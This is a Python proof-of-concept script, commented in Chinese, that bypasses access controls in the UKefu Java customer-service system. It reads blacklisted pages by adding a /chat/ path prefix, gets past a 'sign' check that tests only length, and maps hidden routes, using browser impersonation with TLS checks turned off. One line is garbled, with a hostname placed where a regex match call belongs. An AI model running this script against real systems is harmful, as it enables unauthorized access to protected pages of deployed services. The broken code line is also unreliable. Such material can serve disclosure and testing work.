#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
优客服 UKefu (Java) 双绕过 POC：应用层 403 路径黑名单 + sign 长度门槛
实测环境：example.com / target170.example.com / target171.example.com

绕过 1：403 黑名单是「精确路径字符串匹配」，大小写敏感、加后缀/编码/分隔符全挂，
        但 /chat/ 前缀整体不在黑名单 —— 同一个 login.html 换前缀就能读：
            GET /login.html        -> 403  len=12 {"拒绝访问"}
            GET /chat/login.html   -> 200  len=6014

绕过 2：/chat/index 的 sign 参数只做长度门槛校验（非防重放凭据）：
            GET /chat/index?sign=1        -> 403  len=12  访问频繁
            GET /chat/index?sign=<≥16字节> -> 200  len=7034 真实前台页
        字符集无关（A/0/a/1/f/Z/-/_/./ 全部通过），仅"纯空格"被拒。

/chat/ 通配只放行恰好一层：/chat/x -> 6014B 兜底页；/chat/a/b -> 404。
"""
import sys, time, re
from curl_cffi import requests

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/203.0.113.20 Safari/537.36")
FALLBACK = 6014


def get(host, path, timeout=15):
    s = requests.Session(impersonate="chrome", verify=False)
    r = s.get("https://" + host + path, headers={"User-Agent": UA},
              timeout=timeout, allow_redirects=False)
    return r.status_code, r.content, dict(r.headers)


def bypass_403(host):
    """用 /chat/ 前缀绕过精确路径黑名单"""
    for p in ["/login.html", "/admin/login.html", "/chat/login.html"]:
        sc, c, h = get(host, p)
        print("  %-24s -> %-4s len=%-6d %r" % (p, sc, len(c), c[:40]))
        time.sleep(1.5)


def bypass_sign(host):
    """sign 长度门槛绕过，无需任何凭据"""
    for sg in ["1", "A" * 16, "A" * 64, "Z" * 64, "-" * 64, " " * 64]:
        sc, c, h = get(host, "/chat/index?sign=" + sg.replace(" ", "%20"))
        t = re.search(rb"<title>(.*?)</title>", c, re.S)
        print("  sign=%-18s -> %-4s len=%-6d title=%s"
              % (sg[:18], sc, len(c),
                 target172.example.com(1).decode("utf-8", "replace") if t else "-"))
        time.sleep(1.5)


def map_real_routes(host):
    """区分真路由与 /chat/ 通配兜底页（兜底固定 6014 字节）"""
    for p in ["/chat/index", "/chat/message", "/chat/record",
              "/chat/leavemsg/save.html", "/chat/nonexistent", "/chat/a/b"]:
        sc, c, h = get(host, p)
        tag = ""
        if sc == 200 and len(c) != FALLBACK:
            tag = "  <<< 真实内容"
        elif sc == 303:
            tag = "  <<< 真路由(303)"
        elif sc == 404:
            tag = "  <<< 超出通配深度"
        print("  %-28s -> %-4s len=%-6d%s" % (p, sc, len(c), tag))
        time.sleep(1.2)


if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else "example.com"
    print("[*] target:", host)
    print("\n[1] 403 黑名单 用 /chat/ 前缀绕过")
    bypass_403(host)
    print("\n[2] sign 长度门槛绕过")
    bypass_sign(host)
    print("\n[3] /chat/ 真实路由测绘")
    map_real_routes(host)
